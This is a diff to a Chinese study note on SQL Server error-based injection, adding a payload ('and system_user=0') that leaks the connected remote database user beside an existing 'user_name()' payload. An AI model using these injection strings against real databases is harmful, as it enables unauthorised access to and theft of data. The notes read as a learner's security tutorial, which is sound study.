@@ -24,11 +24,27 @@ and @@version<0  #系统版本字符串与整型0比较报错
 
 ## 爆用户名
 
+### 数据库用户名
+
+当前执行操作的用户
+
 ```shell
 and user_name()<0  #用户名字符串与整型0比较报错
 ```
 
 ![爆Sqlserver用户名](images/07-Sqlserver注入方式/爆Sqlserver用户名.png)
+
+
+
+### 远程连接用户名
+
+当前远程连接数据库的用户
+
+```shell
+and system_user=0  #用户名字符串与整型0比较报错
+```
+
+![当前远程连接用户](images/07-Sqlserver注入方式/当前远程连接用户.png)
 
 
 
@@ -77,6 +93,8 @@ and (select top 1 column_name from Testdb.information_schema.columns where table
 ![爆字段名](images/07-Sqlserver注入方式/爆字段名.png)
 
 
+
+【持续学习中···】
 
 
 
